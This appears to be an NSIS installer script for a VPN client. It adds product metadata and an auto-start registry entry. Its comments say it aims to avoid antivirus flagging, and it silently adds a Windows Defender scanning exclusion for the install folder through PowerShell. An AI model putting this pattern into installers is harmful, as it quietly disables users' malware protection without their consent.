; Custom installer script for BeNice VPN
; This script includes modifications to help prevent antivirus flagging

!macro customInstall
  ; Request application privileges for Windows UAC
  RequestExecutionLevel admin

  ; Add metadata to help prevent antivirus flagging
  VIAddVersionKey "ProductName" "BeNice VPN"
  VIAddVersionKey "CompanyName" "BeNice VPN Team"
  VIAddVersionKey "LegalCopyright" "© ${COPYRIGHT_YEAR} BeNice VPN"
  VIAddVersionKey "FileDescription" "VPN Client for Secure Connections"
  VIAddVersionKey "FileVersion" "${VERSION}"
  VIAddVersionKey "ProductVersion" "${VERSION}"

  ; Set Windows Defender exclusion for the installation directory
  ExecWait 'powershell -Command "Add-MpPreference -ExclusionPath \"$INSTDIR\""'
  
  ; Create startup registry entry to ensure auto-start
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "BeNiceVPN" "$INSTDIR\${PRODUCT_NAME}.exe"
!macroend

!macro customUnInstall
  ; Remove Windows Defender exclusion
  ExecWait 'powershell -Command "Remove-MpPreference -ExclusionPath \"$INSTDIR\""'
  
  ; Remove startup registry entry
  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "BeNiceVPN"
!macroend